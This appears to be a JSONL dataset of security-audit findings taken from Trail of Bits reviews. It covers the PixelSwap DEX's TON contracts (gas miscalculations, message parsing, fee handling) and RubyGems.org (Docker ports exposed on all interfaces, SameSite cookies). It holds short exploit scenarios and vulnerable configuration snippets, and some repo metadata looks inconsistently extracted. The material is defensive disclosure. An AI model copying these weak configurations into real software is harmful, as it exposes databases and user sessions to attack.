{"schema_version": "0.1", "scvd_id": "SCVD-trailofbits_2024-12-pixelswap-dex-securityreview-018", "doc_id": "trailofbits_2024-12-pixelswap-dex-securityreview", "finding_index": 18, "page_start": 46, "title": "Different parsing formats for Jetton notification messages", "short_summary": null, "description_md": "# Description\n\nThe Jetton notification message for [transfer\\\\_notification](https://github.com/ton-blockchain/TEPs/blob/master/text/0074-jettons-standard.md), with ID 0x7362d09c, is defined differently for the settlement and the Stream Pool contracts. In particular, the fund\\_id and subaccount structure fields are read in reverse order, as shown in figures 18.1 and 18.2.\n\n#### **[Redacted]**\n", "full_markdown": "# 18. Different parsing formats for Jetton notification messages\n\n| Severity: Medium                                                                             | Diffi culty: High      |  |\n|-------------------------------------------------------------------------------------------------|------------------------------|--|\n| Type: Data Validation                                                                     | Finding ID: TOB-PXL-18 |  |\n| contracts/pixelswap_settlement.tact, Target: contracts/pixelswap_streampool_messages.tact |                              |  |\n\n# Description\n\nThe Jetton notification message for [transfer\\\\_notification](https://github.com/ton-blockchain/TEPs/blob/master/text/0074-jettons-standard.md), with ID 0x7362d09c, is defined differently for the settlement and the Stream Pool contracts. In particular, the fund\\_id and subaccount structure fields are read in reverse order, as shown in figures 18.1 and 18.2.\n\n#### **[Redacted]**\n\n#### Exploit Scenario\n\nOff-chain components and UI projects mistakenly send the wrong value for the fund\\_id and subaccount fields, causing funds to be lost.\n\n#### Recommendations\n\nShort term, standardize the structure of the messages that share the same ID or same fields.\n\nLong term, avoid duplication of message types. Even if the functions' data needs are different, having different names and structures for the same message is confusing and error-prone. Define shared messages in a single place.\n\n#### **Fix Review Status**\n", "severity": "Medium", "difficulty": "High", "type": "Data Validation", "finding_id": "TOB-PXL-18", "target": {"path": "contracts/pixelswap_streampool_messages.tact", "language": null, "chain": null, "contract_name": null, "contract_address": null, "function": null, "bytecode_hash": null, "caip_id": null}, "repo": {"url": "https://github.com/nx-fi/pixelswap", "org": "nx-fi", "name": "pixelswap", "commit": "5c24e13fcae51b250bd70e0a812ce69a9b3dee4a", "branch": null, "relative_file": "contracts/pixelswap_streampool_messages.tact", "lines": null}, "taxonomy": {"swc": [], "cwe": [], "tags": []}, "status": {"fix_status": null, "fixed_in_commit": null, "fixed_in_pr": [], "exploited_in_the_wild": null, "cvss": null, "bounty_reference": null}, "references": [], "provenance": {"source_pdf": "2024-12-pixelswap-dex-securityreview.pdf", "source_mtime": "2025-11-01T12:04:44+00:00", "report_extracted_at": "2025-11-12T02:12:15.739604+00:00", "report_extractor_version": "poc-0.4", "report_extraction_tool": "marker+qwen3:8b", "scvd_normalized_at": "2025-11-12T02:12:15.742950+00:00", "scvd_normalizer_version": "poc-0.1"}, "metadata_raw": {"Severity": "Medium", "Difficulty": "High", "Type": "Data Validation", "Finding ID": "TOB-PXL-18", "Target": "contracts/pixelswap_streampool_messages.tact"}}
{"schema_version": "0.1", "scvd_id": "SCVD-trailofbits_2024-12-pixelswap-dex-securityreview-019", "doc_id": "trailofbits_2024-12-pixelswap-dex-securityreview", "finding_index": 19, "page_start": 47, "title": "The JettonFactory contract allows minting zero tokens", "short_summary": null, "description_md": "#### Description\n\nThe mint function of the JettonFactory trait does not validate that the amount of coins to mint is greater than zero, therefore allowing a mint of zero tokens.\n\n#### **[Redacted]**\n\nIn the current state of the codebase, it is not possible to trigger this zero-amount mint for the LP tokens since the add\\_liquidity function checks for a minimum liquidity of 1000 to be added. However, if this same trait is used in other contracts, it can become an issue.\n", "full_markdown": "# 19. The JettonFactory contract allows minting zero tokens\n\n| Severity: Informational  | Diffi culty: Undetermined |  |\n|-----------------------------|---------------------------------|--|\n| Type: Data Validation | Finding ID: TOB-PXL-19    |  |\n|                             |                                 |  |\n\nTarget: contracts/jetton/jetton\\_factory.tact\n\n#### Description\n\nThe mint function of the JettonFactory trait does not validate that the amount of coins to mint is greater than zero, therefore allowing a mint of zero tokens.\n\n#### **[Redacted]**\n\nIn the current state of the codebase, it is not possible to trigger this zero-amount mint for the LP tokens since the add\\_liquidity function checks for a minimum liquidity of 1000 to be added. However, if this same trait is used in other contracts, it can become an issue.\n\n#### Recommendations\n\nShort term, add a validation check to ensure the amount is greater than zero.\n\nLong term, consider the possible edge cases in all functions, define the behavior, and implement test cases to ensure compliance.\n\n#### **Fix Review Status**\n", "severity": "Informational", "difficulty": "Undetermined", "type": "Data Validation", "finding_id": "TOB-PXL-19", "target": {"path": "contracts/jetton/jetton_factory.tact", "language": null, "chain": null, "contract_name": null, "contract_address": null, "function": null, "bytecode_hash": null, "caip_id": null}, "repo": {"url": "https://github.com/ton-blockchain/TEPs", "org": "ton-blockchain", "name": "TEPs", "commit": null, "branch": null, "relative_file": "contracts/jetton/jetton_factory.tact", "lines": null}, "taxonomy": {"swc": [], "cwe": [], "tags": []}, "status": {"fix_status": null, "fixed_in_commit": null, "fixed_in_pr": [], "exploited_in_the_wild": null, "cvss": null, "bounty_reference": null}, "references": [], "provenance": {"source_pdf": "2024-12-pixelswap-dex-securityreview.pdf", "source_mtime": "2025-11-01T12:04:44+00:00", "report_extracted_at": "2025-11-12T02:12:15.739604+00:00", "report_extractor_version": "poc-0.4", "report_extraction_tool": "marker+qwen3:8b", "scvd_normalized_at": "2025-11-12T02:12:15.742950+00:00", "scvd_normalizer_version": "poc-0.1"}, "metadata_raw": {"Severity": "Informational", "Difficulty": "Undetermined", "Type": "Data Validation", "Finding ID": "TOB-PXL-19", "Target": "contracts/jetton/jetton_factory.tact"}}
{"schema_version": "0.1", "scvd_id": "SCVD-trailofbits_2024-12-pixelswap-dex-securityreview-020", "doc_id": "trailofbits_2024-12-pixelswap-dex-securityreview", "finding_index": 20, "page_start": 48, "title": "Incorrect gas calculations in several contracts", "short_summary": null, "description_md": "#### Description\n\nTON contracts, being a part of an asynchronous blockchain, can process messages in a non-deterministic order. In some cases, the incoming messages require the contract to perform changes in the storage, send new messages, and other gas-consuming tasks.\n\nIt is important to take into account the gas costs associated with executing functions or sending messages to ensure that the contract's final balance after execution does not drop below a threshold. Otherwise, if the balance is zero, the contract cannot pay for storage costs and can eventually be destroyed.\n\nWe noticed several places where the gas calculations were not correct or did not consider all of the costs that must be paid. We did not assess the exact severity of this issue because these calculations may have a long-reaching impact on the affected functions and further calls, and can depend on external factors unknown at the time.\n\n- Swap [message handler](https://github.com/nx-fi/pixelswap/blob/5c24e13fcae51b250bd70e0a812ce69a9b3dee4a/contracts/pixelswap_settlement.tact#L442) in pixelswap\\_settlement.tact should consider the storage fees, the gas consumed, and the gas for paused contract refund.\n- Later, [line 463](https://github.com/nx-fi/pixelswap/blob/5c24e13fcae51b250bd70e0a812ce69a9b3dee4a/contracts/pixelswap_settlement.tact#L463) should check that the resulting amount is greater than gas\\_check\\_swap\\_message.\n- Lines [454](https://github.com/nx-fi/pixelswap/blob/5c24e13fcae51b250bd70e0a812ce69a9b3dee4a/contracts/pixelswap_settlement.tact#L454) and [468](https://github.com/nx-fi/pixelswap/blob/5c24e13fcae51b250bd70e0a812ce69a9b3dee4a/contracts/pixelswap_settlement.tact#L468) should deduct gas\\_consumed().\n- PlaceOrder [message handler](https://github.com/nx-fi/pixelswap/blob/5c24e13fcae51b250bd70e0a812ce69a9b3dee4a/contracts/pixelswap_streampool.tact#L185) in pixelswap\\_streampool.tact should consider the message transfer fee.\n- [RemoveLiquidityJettonNotification](https://github.com/nx-fi/pixelswap/blob/5c24e13fcae51b250bd70e0a812ce69a9b3dee4a/contracts/pixelswap_streampool.tact#L273-L280) message handler should consider the transfer\\_notification\\_handler gas fee or use the remaining gas instead of context().value.\n- Later, [line 297](https://github.com/nx-fi/pixelswap/blob/5c24e13fcae51b250bd70e0a812ce69a9b3dee4a/contracts/pixelswap_streampool.tact#L297) subtracts remove\\_liquidity gas twice because the call was already made. It is not checked that the remaining gas is more than the required token0 and token1 gas amounts.\n", "full_markdown": "# 20. Incorrect gas calculations in several contracts\n\n| Severity: Undetermined                                                              | Diffi culty: Undetermined |  |\n|----------------------------------------------------------------------------------------|---------------------------------|--|\n| Type: Data Validation                                                            | Finding ID: TOB-PXL-20    |  |\n| contracts/pixelswap_streampool.tact, Target: contracts/pixelswap_settlement.tact |                                 |  |\n\n#### Description\n\nTON contracts, being a part of an asynchronous blockchain, can process messages in a non-deterministic order. In some cases, the incoming messages require the contract to perform changes in the storage, send new messages, and other gas-consuming tasks.\n\nIt is important to take into account the gas costs associated with executing functions or sending messages to ensure that the contract's final balance after execution does not drop below a threshold. Otherwise, if the balance is zero, the contract cannot pay for storage costs and can eventually be destroyed.\n\nWe noticed several places where the gas calculations were not correct or did not consider all of the costs that must be paid. We did not assess the exact severity of this issue because these calculations may have a long-reaching impact on the affected functions and further calls, and can depend on external factors unknown at the time.\n\n- Swap [message handler](https://github.com/nx-fi/pixelswap/blob/5c24e13fcae51b250bd70e0a812ce69a9b3dee4a/contracts/pixelswap_settlement.tact#L442) in pixelswap\\_settlement.tact should consider the storage fees, the gas consumed, and the gas for paused contract refund.\n- Later, [line 463](https://github.com/nx-fi/pixelswap/blob/5c24e13fcae51b250bd70e0a812ce69a9b3dee4a/contracts/pixelswap_settlement.tact#L463) should check that the resulting amount is greater than gas\\_check\\_swap\\_message.\n- Lines [454](https://github.com/nx-fi/pixelswap/blob/5c24e13fcae51b250bd70e0a812ce69a9b3dee4a/contracts/pixelswap_settlement.tact#L454) and [468](https://github.com/nx-fi/pixelswap/blob/5c24e13fcae51b250bd70e0a812ce69a9b3dee4a/contracts/pixelswap_settlement.tact#L468) should deduct gas\\_consumed().\n- PlaceOrder [message handler](https://github.com/nx-fi/pixelswap/blob/5c24e13fcae51b250bd70e0a812ce69a9b3dee4a/contracts/pixelswap_streampool.tact#L185) in pixelswap\\_streampool.tact should consider the message transfer fee.\n- [RemoveLiquidityJettonNotification](https://github.com/nx-fi/pixelswap/blob/5c24e13fcae51b250bd70e0a812ce69a9b3dee4a/contracts/pixelswap_streampool.tact#L273-L280) message handler should consider the transfer\\_notification\\_handler gas fee or use the remaining gas instead of context().value.\n- Later, [line 297](https://github.com/nx-fi/pixelswap/blob/5c24e13fcae51b250bd70e0a812ce69a9b3dee4a/contracts/pixelswap_streampool.tact#L297) subtracts remove\\_liquidity gas twice because the call was already made. It is not checked that the remaining gas is more than the required token0 and token1 gas amounts.\n\n\n\n### Recommendations\n\nShort term, ensure that the gas calculations correctly account for the message transfer fee, storage fee, computation fee, and forward TON amount in the mentioned places and all other places where they are calculated.\n\nLong term, measure all execution paths and their gas requirements to ensure that the amounts are correctly calculated through tests.\n\n#### **Fix Review Status**\n", "severity": "Undetermined", "difficulty": "Undetermined", "type": "Data Validation", "finding_id": "TOB-PXL-20", "target": {"path": "contracts/pixelswap_settlement.tact, contracts/pixelswap_streampool.tact", "language": null, "chain": null, "contract_name": null, "contract_address": null, "function": null, "bytecode_hash": null, "caip_id": null}, "repo": {"url": "https://github.com/ton-blockchain/TEPs", "org": "ton-blockchain", "name": "TEPs", "commit": null, "branch": null, "relative_file": "contracts/pixelswap_settlement.tact, contracts/pixelswap_streampool.tact", "lines": null}, "taxonomy": {"swc": [], "cwe": [], "tags": []}, "status": {"fix_status": null, "fixed_in_commit": null, "fixed_in_pr": [], "exploited_in_the_wild": null, "cvss": null, "bounty_reference": null}, "references": [], "provenance": {"source_pdf": "2024-12-pixelswap-dex-securityreview.pdf", "source_mtime": "2025-11-01T12:04:44+00:00", "report_extracted_at": "2025-11-12T02:12:15.739604+00:00", "report_extractor_version": "poc-0.4", "report_extraction_tool": "marker+qwen3:8b", "scvd_normalized_at": "2025-11-12T02:12:15.742950+00:00", "scvd_normalizer_version": "poc-0.1"}, "metadata_raw": {"Severity": "Undetermined", "Difficulty": "Undetermined", "Type": "Data Validation", "Finding ID": "TOB-PXL-20", "Target": "contracts/pixelswap_settlement.tact, contracts/pixelswap_streampool.tact"}}
{"schema_version": "0.1", "scvd_id": "SCVD-trailofbits_2024-12-pixelswap-dex-securityreview-021", "doc_id": "trailofbits_2024-12-pixelswap-dex-securityreview", "finding_index": 21, "page_start": 50, "title": "A privileged account can drain the PixelswapStreamPool contract", "short_summary": null, "description_md": "#### Description\n\nIn the PixelswapStreamPool contract, there are two ways to create new tokens and new trading pairs by sending CreateToken and CreateTradingPair messages: the first one requires being a privileged account, and the second one requires the sender to be enabled for adding tokens and pairs, and also paying a creation fee intended to avoid spamming.\n\nSince the privileged account does not require paying the fee or sending TON at all, it is possible to drain the balance of the PixelswapStreamPool contract because the message handler sends the fee to the recipient in all cases.\n\n#### **[Redacted]**\n", "full_markdown": "# 21. A privileged account can drain the PixelswapStreamPool contract\n\n| Severity: Low                                | Diffi culty: High      |  |\n|-------------------------------------------------|------------------------------|--|\n| Type: Access Controls                     | Finding ID: TOB-PXL-21 |  |\n| Target: fcontracts/pixelswap_streampool.tact |                              |  |\n\n#### Description\n\nIn the PixelswapStreamPool contract, there are two ways to create new tokens and new trading pairs by sending CreateToken and CreateTradingPair messages: the first one requires being a privileged account, and the second one requires the sender to be enabled for adding tokens and pairs, and also paying a creation fee intended to avoid spamming.\n\nSince the privileged account does not require paying the fee or sending TON at all, it is possible to drain the balance of the PixelswapStreamPool contract because the message handler sends the fee to the recipient in all cases.\n\n#### **[Redacted]**\n\n#### Exploit Scenario\n\nAlice, a privileged account in the Stream Pool contract, decides to add new tokens and trading pairs to the system. Since she is not required to send additional value in her messages, she sends messages with the minimum amount possible to pay for the computation.\n\nWhile the PixelswapStreamPool contract has a balance, she is able to add the tokens and pairs. However, once the balance becomes zero, the transactions will start failing, putting the contract at risk of not being able to pay storage fees.\n\n#### Recommendations\n\nShort term, check for the contract balance before sending the fee payment.\n\nLong term, improve the test suite to consider all combinations of privileged and unprivileged users performing actions on the system. Check for balances before and after the transactions are executed, and ensure that the final balance is enough for storage fees.\n\n#### **Fix Review Status**\n", "severity": "Low", "difficulty": "High", "type": "Access Controls", "finding_id": "TOB-PXL-21", "target": {"path": "fcontracts/pixelswap_streampool.tact", "language": null, "chain": null, "contract_name": null, "contract_address": null, "function": null, "bytecode_hash": null, "caip_id": null}, "repo": {"url": "https://github.com/ton-blockchain/TEPs", "org": "ton-blockchain", "name": "TEPs", "commit": null, "branch": null, "relative_file": "fcontracts/pixelswap_streampool.tact", "lines": null}, "taxonomy": {"swc": [], "cwe": [], "tags": []}, "status": {"fix_status": null, "fixed_in_commit": null, "fixed_in_pr": [], "exploited_in_the_wild": null, "cvss": null, "bounty_reference": null}, "references": [], "provenance": {"source_pdf": "2024-12-pixelswap-dex-securityreview.pdf", "source_mtime": "2025-11-01T12:04:44+00:00", "report_extracted_at": "2025-11-12T02:12:15.739604+00:00", "report_extractor_version": "poc-0.4", "report_extraction_tool": "marker+qwen3:8b", "scvd_normalized_at": "2025-11-12T02:12:15.742950+00:00", "scvd_normalizer_version": "poc-0.1"}, "metadata_raw": {"Severity": "Low", "Difficulty": "High", "Type": "Access Controls", "Finding ID": "TOB-PXL-21", "Target": "fcontracts/pixelswap_streampool.tact"}}
{"schema_version": "0.1", "scvd_id": "SCVD-trailofbits_2024-12-pixelswap-dex-securityreview-022", "doc_id": "trailofbits_2024-12-pixelswap-dex-securityreview", "finding_index": 22, "page_start": 51, "title": "The fee recipient accounts cannot be changed in the Stream Pool contract", "short_summary": null, "description_md": "#### Description\n\nThe creation\\_fee\\_recipient and protocol\\_fee\\_recipient addresses are set once in the PixelswapStreamPool contract constructor and cannot be changed.\n\nIf, for some reason, access to those accounts is lost or compromised, the protocol will continue to send funds to them, increasing the financial damage over time and making it impossible for the team to recover funds.\n\nMoreover, the protocol\\_fee\\_recipient account is not used in the PixelswapStreamPool contract.\n", "full_markdown": "### 22. The fee recipient accounts cannot be changed in the Stream Pool contract\n\n| Severity: Informational                     | Diffi culty: Undetermined |  |\n|------------------------------------------------|---------------------------------|--|\n| Type: Access Controls                    | Finding ID: TOB-PXL-22    |  |\n| contracts/pixelswap_streampool.tact Target: |                                 |  |\n\n#### Description\n\nThe creation\\_fee\\_recipient and protocol\\_fee\\_recipient addresses are set once in the PixelswapStreamPool contract constructor and cannot be changed.\n\nIf, for some reason, access to those accounts is lost or compromised, the protocol will continue to send funds to them, increasing the financial damage over time and making it impossible for the team to recover funds.\n\nMoreover, the protocol\\_fee\\_recipient account is not used in the PixelswapStreamPool contract.\n\n#### Recommendations\n\nShort term, consider having a privileged method to change these fee recipients.\n\nLong term, determine if these accounts will be used, what security measures will be in place for setting and changing their values, and under what circumstances the change should be made.\n\n#### **Fix Review Status**\n", "severity": "Informational", "difficulty": "Undetermined", "type": "Access Controls", "finding_id": "TOB-PXL-22", "target": {"path": "contracts/pixelswap_streampool.tact", "language": null, "chain": null, "contract_name": null, "contract_address": null, "function": null, "bytecode_hash": null, "caip_id": null}, "repo": {"url": "https://github.com/nx-fi/pixelswap", "org": "nx-fi", "name": "pixelswap", "commit": "5c24e13fcae51b250bd70e0a812ce69a9b3dee4a", "branch": null, "relative_file": "contracts/pixelswap_streampool.tact", "lines": null}, "taxonomy": {"swc": [], "cwe": [], "tags": []}, "status": {"fix_status": null, "fixed_in_commit": null, "fixed_in_pr": [], "exploited_in_the_wild": null, "cvss": null, "bounty_reference": null}, "references": [], "provenance": {"source_pdf": "2024-12-pixelswap-dex-securityreview.pdf", "source_mtime": "2025-11-01T12:04:44+00:00", "report_extracted_at": "2025-11-12T02:12:15.739604+00:00", "report_extractor_version": "poc-0.4", "report_extraction_tool": "marker+qwen3:8b", "scvd_normalized_at": "2025-11-12T02:12:15.742950+00:00", "scvd_normalizer_version": "poc-0.1"}, "metadata_raw": {"Severity": "Informational", "Difficulty": "Undetermined", "Type": "Access Controls", "Finding ID": "TOB-PXL-22", "Target": "contracts/pixelswap_streampool.tact"}}
{"schema_version": "0.1", "scvd_id": "SCVD-trailofbits_2024-12-pixelswap-dex-securityreview-023", "doc_id": "trailofbits_2024-12-pixelswap-dex-securityreview", "finding_index": 23, "page_start": 52, "title": "The gas checks in the PixelswapStreamPool contract are wrongly placed", "short_summary": null, "description_md": "#### Description\n\nThe gas checks in the PlaceOrder message receiver of the PixelswapStreamPool contract are placed after the pair\\_status update. This can lead to loss of funds for user and pair reserves and balances going out of sync.\n\nThe PlaceOrder message receiver of the PixelswapStreamPool contract adds two gas checks. It adds one at the end of the process\\_order internal function:\n\n#### **[Redacted]**\n\nIt adds another at the end of the receiver function:\n\n#### **[Redacted]**\n\nHowever, the process\\_order function updates the pair reserves in the pair\\_status map for the specified pair\\_id before these gas checks. If, for some reason, these gas checks fail, then it can have the following effect:\n\n- If the gas check in the receiver function fails, then the PlaceOrder message will be sent back to the settlement contract and will add the input tokens back to the user's funding wallet balance.\n- If the gas check in the process\\_order function fails while processing a nested PlaceOrder message, then only the current PlaceOrder and its nested PlaceOrder messages are returned to the settlement contract. This adds input tokens to the user's funding wallet balance only for these orders instead of all of the orders. The user also loses the output token of swaps for successfully executed PlaceOrder messages.\n- In every case, the reserves of the specified pair and token balances of the settlement contract go out of sync, resulting in an unstable system state.\n\nCurrently, the gas checks in the PixelswapFundingWallet and PixelswapSettlement contracts ensure that the gas checks in the PixelswapStreamPool contract do not fail. However, future updates to the codebase could introduce a path to fail these gas checks.\n", "full_markdown": "# 23. The gas checks in the PixelswapStreamPool contract are wrongly placed\n\n| Severity: Informational                     | Diffi culty: High      |  |\n|------------------------------------------------|------------------------------|--|\n| Type: Data Validation                    | Finding ID: TOB-PXL-23 |  |\n| Target: contracts/pixelswap_streampool.tact |                              |  |\n\n#### Description\n\nThe gas checks in the PlaceOrder message receiver of the PixelswapStreamPool contract are placed after the pair\\_status update. This can lead to loss of funds for user and pair reserves and balances going out of sync.\n\nThe PlaceOrder message receiver of the PixelswapStreamPool contract adds two gas checks. It adds one at the end of the process\\_order internal function:\n\n#### **[Redacted]**\n\nIt adds another at the end of the receiver function:\n\n#### **[Redacted]**\n\nHowever, the process\\_order function updates the pair reserves in the pair\\_status map for the specified pair\\_id before these gas checks. If, for some reason, these gas checks fail, then it can have the following effect:\n\n- If the gas check in the receiver function fails, then the PlaceOrder message will be sent back to the settlement contract and will add the input tokens back to the user's funding wallet balance.\n- If the gas check in the process\\_order function fails while processing a nested PlaceOrder message, then only the current PlaceOrder and its nested PlaceOrder messages are returned to the settlement contract. This adds input tokens to the user's funding wallet balance only for these orders instead of all of the orders. The user also loses the output token of swaps for successfully executed PlaceOrder messages.\n- In every case, the reserves of the specified pair and token balances of the settlement contract go out of sync, resulting in an unstable system state.\n\nCurrently, the gas checks in the PixelswapFundingWallet and PixelswapSettlement contracts ensure that the gas checks in the PixelswapStreamPool contract do not fail. However, future updates to the codebase could introduce a path to fail these gas checks.\n\n\n\n#### Recommendations\n\nShort term, place the above-mentioned gas checks before calls to the state-modifying functions to ensure the correct state in case of gas check failure.\n\nLong term, document the system state specification with user actions and their effect on the system state to identify potential issues arising from complex user interactions.\n\n#### **Fix Review Status**\n", "severity": "Informational", "difficulty": "High", "type": "Data Validation", "finding_id": "TOB-PXL-23", "target": {"path": "contracts/pixelswap_streampool.tact", "language": null, "chain": null, "contract_name": null, "contract_address": null, "function": null, "bytecode_hash": null, "caip_id": null}, "repo": {"url": "https://github.com/nx-fi/pixelswap", "org": "nx-fi", "name": "pixelswap", "commit": "5c24e13fcae51b250bd70e0a812ce69a9b3dee4a", "branch": null, "relative_file": "contracts/pixelswap_streampool.tact", "lines": null}, "taxonomy": {"swc": [], "cwe": [], "tags": []}, "status": {"fix_status": null, "fixed_in_commit": null, "fixed_in_pr": [], "exploited_in_the_wild": null, "cvss": null, "bounty_reference": null}, "references": [], "provenance": {"source_pdf": "2024-12-pixelswap-dex-securityreview.pdf", "source_mtime": "2025-11-01T12:04:44+00:00", "report_extracted_at": "2025-11-12T02:12:15.739604+00:00", "report_extractor_version": "poc-0.4", "report_extraction_tool": "marker+qwen3:8b", "scvd_normalized_at": "2025-11-12T02:12:15.742950+00:00", "scvd_normalizer_version": "poc-0.1"}, "metadata_raw": {"Severity": "Informational", "Difficulty": "High", "Type": "Data Validation", "Finding ID": "TOB-PXL-23", "Target": "contracts/pixelswap_streampool.tact"}}
{"schema_version": "0.1", "scvd_id": "SCVD-trailofbits_2024-12-pixelswap-dex-securityreview-024", "doc_id": "trailofbits_2024-12-pixelswap-dex-securityreview", "finding_index": 24, "page_start": 54, "title": "Users cannot deposit only Jetton to their funding wallet", "short_summary": null, "description_md": null, "full_markdown": "| 24. Users cannot deposit only Jetton to their funding wallet |                              |  |\n|-----------------------------------------------------------------------------------------|------------------------------|--|\n| Severity: Informational                                                              | Diffi culty: Low       |  |\n| Type: Data Validation                                                             | Finding ID: TOB-PXL-24 |  |\n| contracts/pixelswap_settlement.tact Target:                                          |                              |  |\n\nThe gas check in the OrderJettonNotification handler of the PixelswapSettlement contract ensures that the TON sent by the user is more than the value of the gas\\_check\\_jetton\\_notification parameter, which is 500 millitons, and that the ton\\_amt is calculated by subtracting the gas\\_for\\_incoming\\_jetton\\_transfer value, which is 400 millitons, from the message value.\n\nBecause of this, the user needs to deposit at least 100 millitons of TON along with any Jetton deposit, and there is no way for a user to deposit only Jetton to their funding wallet.\n\n#### **[Redacted]**\n\nDescription\n\n### Recommendations\n\nShort term, accept the TON amount to deposit as a message parameter instead of calculating it in the contract, and return the excess TON sent as the message value.\n\nLong term, implement test cases for all real-life use cases to ensure expected behavior from the smart contracts.\n\n#### **Fix Review Status**\n", "severity": "Informational", "difficulty": "Low", "type": "Data Validation", "finding_id": "TOB-PXL-24", "target": {"path": "contracts/pixelswap_settlement.tact", "language": null, "chain": null, "contract_name": null, "contract_address": null, "function": null, "bytecode_hash": null, "caip_id": null}, "repo": {"url": "https://github.com/nx-fi/pixelswap", "org": "nx-fi", "name": "pixelswap", "commit": "5c24e13fcae51b250bd70e0a812ce69a9b3dee4a", "branch": null, "relative_file": "contracts/pixelswap_settlement.tact", "lines": null}, "taxonomy": {"swc": [], "cwe": [], "tags": []}, "status": {"fix_status": null, "fixed_in_commit": null, "fixed_in_pr": [], "exploited_in_the_wild": null, "cvss": null, "bounty_reference": null}, "references": [], "provenance": {"source_pdf": "2024-12-pixelswap-dex-securityreview.pdf", "source_mtime": "2025-11-01T12:04:44+00:00", "report_extracted_at": "2025-11-12T02:12:15.739604+00:00", "report_extractor_version": "poc-0.4", "report_extraction_tool": "marker+qwen3:8b", "scvd_normalized_at": "2025-11-12T02:12:15.742950+00:00", "scvd_normalizer_version": "poc-0.1"}, "metadata_raw": {"Severity": "Informational", "Difficulty": "Low", "Type": "Data Validation", "Finding ID": "TOB-PXL-24", "Target": "contracts/pixelswap_settlement.tact"}}
{"schema_version": "0.1", "scvd_id": "SCVD-trailofbits_2024-12-rubycentral-rubygemsorg-securityreview-001", "doc_id": "trailofbits_2024-12-rubycentral-rubygemsorg-securityreview", "finding_index": 1, "page_start": 21, "title": "Docker Compose ports exposed on all interfaces", "short_summary": null, "description_md": "#### Description\n\nTo specify Docker ports, docker-compose.yml configuration files use the ports configuration option of, for example, 5432:5432 for the Postgres container (figure 1.1). This means that these ports are accessible not just to other processes running on the same computer, but also from other computers on the same network.\n\n```\ndb:\n  image: postgres:13.14\n  ports:\n    - \"5432:5432\"\n  environment:\n    - POSTGRES_HOST_AUTH_METHOD=trust\n```\n\n*Figure 1.1: Ports exposed on all interfaces ([rubygems.org/docker-compose.yml:2–7](https://github.com/rubygems/rubygems.org/blob/21895a522076d15a3cb8d072229e2cfdbdb873e8/docker-compose.yml#L2-L7))*\n", "full_markdown": "| 1. Docker Compose ports exposed on all interfaces |                             |  |\n|------------------------------------------------------------------------|-----------------------------|--|\n| Severity: Low                                                       | Diffi culty: High     |  |\n| Type: Configuration                                                 | Finding ID: TOB-RGM-1 |  |\n\nTarget: rubygems.org/docker-compose.yml\n\n#### Description\n\nTo specify Docker ports, docker-compose.yml configuration files use the ports configuration option of, for example, 5432:5432 for the Postgres container (figure 1.1). This means that these ports are accessible not just to other processes running on the same computer, but also from other computers on the same network.\n\n```\ndb:\n  image: postgres:13.14\n  ports:\n    - \"5432:5432\"\n  environment:\n    - POSTGRES_HOST_AUTH_METHOD=trust\n```\n\n*Figure 1.1: Ports exposed on all interfaces ([rubygems.org/docker-compose.yml:2–7](https://github.com/rubygems/rubygems.org/blob/21895a522076d15a3cb8d072229e2cfdbdb873e8/docker-compose.yml#L2-L7))*\n\n#### Exploit Scenario\n\nA Ruby Central developer runs this docker-compose.yml file while on a public Wi-Fi network. An attacker on the same network connects to the Postgres database running on the developer's computer; this database is available on port 5432 and uses the default password postgres. The attacker can then read and modify any data in the developer's database.\n\n#### Recommendations\n\nShort term, modify these configuration values, setting them to 127.0.0.1:5432:5432 instead of 5432:5432.\n\nLong term, use the [port-all-interfaces](https://github.com/trailofbits/semgrep-rules/blob/main/yaml/docker-compose/port-all-interfaces.yaml) Semgrep static analysis rule to detect and flag instances of this configuration pattern.\n\n#### References\n\n● [Compose file version](https://docs.docker.com/compose/compose-file/compose-file-v3/#ports) 3 reference: ports\n", "severity": "Low", "difficulty": "High", "type": "Configuration", "finding_id": "TOB-RGM-1", "target": {"path": "rubygems.org/docker-compose.yml", "language": null, "chain": null, "contract_name": null, "contract_address": null, "function": null, "bytecode_hash": null, "caip_id": null}, "repo": {"url": "https://github.com/rubygems/rubygems.org", "org": "rubygems", "name": "rubygems.org", "commit": "21895a522076d15a3cb8d072229e2cfdbdb873e8", "branch": null, "relative_file": "rubygems.org/docker-compose.yml", "lines": null}, "taxonomy": {"swc": [], "cwe": [], "tags": []}, "status": {"fix_status": null, "fixed_in_commit": null, "fixed_in_pr": [], "exploited_in_the_wild": null, "cvss": null, "bounty_reference": null}, "references": [], "provenance": {"source_pdf": "2024-12-rubycentral-rubygemsorg-securityreview.pdf", "source_mtime": "2025-11-01T12:04:44+00:00", "report_extracted_at": "2025-11-12T02:19:22.142371+00:00", "report_extractor_version": "poc-0.4", "report_extraction_tool": "marker+qwen3:8b", "scvd_normalized_at": "2025-11-12T02:19:22.148287+00:00", "scvd_normalizer_version": "poc-0.1"}, "metadata_raw": {"Severity": "Low", "Difficulty": "High", "Type": "Configuration", "Finding ID": "TOB-RGM-1", "Target": "rubygems.org/docker-compose.yml"}}
{"schema_version": "0.1", "scvd_id": "SCVD-trailofbits_2024-12-rubycentral-rubygemsorg-securityreview-002", "doc_id": "trailofbits_2024-12-rubycentral-rubygemsorg-securityreview", "finding_index": 2, "page_start": 22, "title": "Rails cookies lack SameSite protections", "short_summary": null, "description_md": "## Description\n\nAs [stated](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Set-Cookie#samesitesamesite-value) in MDN, the SameSite cookie attribute provides the following functionality:\n\nControls whether or not a cookie is sent with cross-site requests, providing some protection against cross-site request forgery attacks (CSRF).\n\nRubyGems disables strict SameSite protections in a number of locations by setting the attributes value to Lax. For example, the following location sets this value explicitly:\n\n```\ndef log_in_as(user:, expires: 1.hour)\n  cookies.encrypted[admin_cookie_name] = {\n    value: user.id,\n    expires: expires,\n    same_site: :lax\n  }\nend\n```\n\n*Figure 2.1: Admin cookie setting SameSite=Lax ([rubygems.org/lib/github\\\\_oauthable.rb#72–78](https://github.com/rubygems/rubygems.org/blob/21895a522076d15a3cb8d072229e2cfdbdb873e8/lib/github_oauthable.rb#L72-L78))*\n\nThis value is also implicitly set on the Rails session cookie in the following location:\n\n```\nRails.application.config.session_store :cookie_store, key: '_rubygems_session'\n               Figure 2.2: Session cookie implicitly setting SameSite=Lax\n           (rubygems.org/config/initializers/session_store.rb#8)\n```\n\nBy default, when using cookie\\_store, the session cookie will set [SameSite](https://guides.rubyonrails.org/configuring.html#config-action-dispatch-cookies-same-site-protection)=Lax. This is better than setting the value to None, but it still ultimately introduces the risk of CSRF attacks. Because Rails provides built-in CSRF protections, this is a 